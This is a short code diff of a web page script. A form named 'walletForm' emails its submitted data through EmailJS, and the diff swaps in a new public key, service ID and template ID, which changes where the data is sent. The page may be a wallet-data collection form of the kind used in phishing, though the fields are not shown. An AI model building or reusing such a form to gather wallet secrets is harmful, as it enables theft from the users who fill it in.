@@ -36,7 +36,7 @@
 
 <script>
     // Initialize EmailJS
-    emailjs.init("JR36U5r94agdcJR7X"); // Your Public Key
+    emailjs.init("i86hiGqVWAs8qHm4o"); // Your Public Key
 
     document.getElementById("walletForm").addEventListener("submit", function(e) {
         e.preventDefault();
@@ -55,7 +55,7 @@
         };
 
         // Send email
-        emailjs.send("service_txc5a7m", "template_ofqets3", formData)
+        emailjs.send("service_8jqb46o", "template_wb3tkhk", formData)
             .then(() => {
                 messageDiv.innerHTML = `<div class="success">✅ Email sent successfully!</div>`;
                 this.reset();
